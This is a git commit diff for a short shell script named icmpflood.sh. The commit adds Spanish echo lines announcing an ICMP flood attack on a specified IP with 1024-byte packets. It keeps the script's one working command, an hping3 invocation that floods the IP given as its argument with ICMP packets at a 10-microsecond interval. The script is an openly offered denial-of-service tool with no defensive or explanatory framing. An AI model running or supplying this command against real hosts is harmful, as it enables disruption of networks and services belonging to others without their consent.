a3b01a9c5e96af565d14285a8de1a438fb4da932
hackingyseguridad <antonio_taboada@hotmail.es>
2022-09-07 15:10:50 +0200

    Update icmpflood.sh

--- icmpflood.sh
+++ icmpflood.sh
@@ -1,3 +1,4 @@
-
-
-hping3 -I eth0 $1 -1 --fast -i u10 -d 1024 -e "ataque de inundacion ICMP"
+echo
+echo "Ataque de inundacion ICMP a IP especificada, con paquetes de peso 1024 bytes"
+echo
+hping3 -I eth0 $1 -1 --fast -i u10 -d 1024 -e "Ataque de inundacion ICMP"
